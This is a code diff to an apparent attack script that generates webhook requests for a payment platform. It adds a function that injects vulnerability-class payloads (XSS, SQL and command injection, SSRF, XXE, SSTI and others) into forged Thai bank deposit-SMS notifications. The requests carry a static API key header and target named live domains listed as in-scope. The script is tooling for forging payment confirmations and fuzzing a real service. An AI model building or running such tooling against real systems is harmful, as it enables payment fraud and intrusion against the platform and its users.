@@ -74,6 +74,76 @@ AMOUNT_VARIANTS = [
     ("space",     " 100.00 "),
 ]
 
+# ── Generic vuln-class payload library ────────────────────────────────────
+PAYLOADS_JSON = Path("/home/kzp/claude-red/nuxt/payloads.json")
+
+
+def load_vuln_payloads(vuln_class: str | None = None) -> dict:
+    if not PAYLOADS_JSON.exists():
+        return {}
+    data = json.loads(PAYLOADS_JSON.read_text())
+    if vuln_class:
+        return {vuln_class: data[vuln_class]} if vuln_class in data else {}
+    return data
+
+
+def build_vuln_payloads(vuln_class: str | None = None) -> list[dict]:
+    """Inject vuln-class payloads into webhook message/address/smsid fields."""
+    vuln_data = load_vuln_payloads(vuln_class)
+    if not vuln_data:
+        return []
+
+    result = []
+    ts_base = int(time.time() * 1000)
+    static_key = get_static_key()
+
+    for cls, variants in vuln_data.items():
+        if isinstance(variants, dict):
+            items = list(variants.items())
+        elif isinstance(variants, list):
+            items = [(f"{cls}_{i}", v) for i, v in enumerate(variants)]
+        else:
+            continue
+
+        for name, payload in items:
+            payload_str = payload if isinstance(payload, str) else json.dumps(payload)
+            ts = ts_base + len(result)
+
+            for field in ("message", "address", "smsid"):
+                body = {
+                    "address":   "KBank",
+                    "message":   "รับเงิน 100.00 บาท",
+                    "timestamp": ts,
+                    "bank_no":   "123-4-56789-0",
+                    "smsid":     f"SMS_VULN_{ts}",
+                    "type":      "deposit",
+                    "bank_code": "KBANK",
+                    "username":  "0812345678",
+                    "password":  "1234",
+                    "amount":    "100.00",
+                }
+                body[field] = payload_str
+
+                result.append({
+                    "id":          f"VULN_{cls}_{name}_{field}_{len(result):04d}",
+                    "bank":        "KBANK",
+                    "amount_type": "normal",
+                    "vuln_class":  cls,
+                    "variant":     name,
+                    "inject_field": field,
+                    "endpoint":    ENDPOINTS["kbank"],
+                    "url":         C2_BASE + ENDPOINTS["kbank"],
+                    "headers": {
+                        "Content-Type": "application/json",
+                        **({"PAPDIEAW-KEY": static_key} if static_key else {}),
+                    },
+                    "body": body,
+                    "note": f"{cls}_{name} injected into {field}",
+                })
+
+    return result
+
+
 # ── In-scope platform + tenant domains ────────────────────────────────────
 SCAN_TARGETS = [
     "bot-auto.ztechdev.com",
@@ -327,6 +397,7 @@ def main():
     ap.add_argument("--scan",    action="store_true", help="Probe all in-scope platform domains")
     ap.add_argument("--verbose", action="store_true", help="With --scan: probe all paths on each live host")
     ap.add_argument("--host",    metavar="HOST",       help="Override C2_BASE host for payload generation")
+    ap.add_argument("--vuln",    metavar="CLASS",      help="Include vuln-class payloads (xss/sqli/cmdi/ssrf/lfi/xxe/jwt/proto/ssti/deser/all)")
     args = ap.parse_args()
 
     global C2_BASE
@@ -348,6 +419,12 @@ def main():
             return
 
     payloads = build_payloads()
+
+    if args.vuln:
+        vc = None if args.vuln == "all" else args.vuln
+        vuln_payloads = build_vuln_payloads(vc)
+        payloads = payloads + vuln_payloads
+        print(f"Vuln-class payloads appended: {len(vuln_payloads)} ({args.vuln})")
 
     if args.filter:
         payloads = [p for p in payloads if p["bank"] == args.filter.upper()]
@@ -410,6 +487,9 @@ def main():
     print("  uv run payloads.py --nuclei           # nuclei YAML template")
     print("  uv run payloads.py --out payloads.json")
     print("  uv run payloads.py --filter KBANK --amount negative")
+    print("  uv run payloads.py --vuln xss --curl   # inject XSS into message/address/smsid")
+    print("  uv run payloads.py --vuln all --json    # full vuln-class suite")
+    print(f"  (vuln library: {PAYLOADS_JSON} — {'found' if PAYLOADS_JSON.exists() else 'NOT FOUND'})")
 
 
 if __name__ == "__main__":
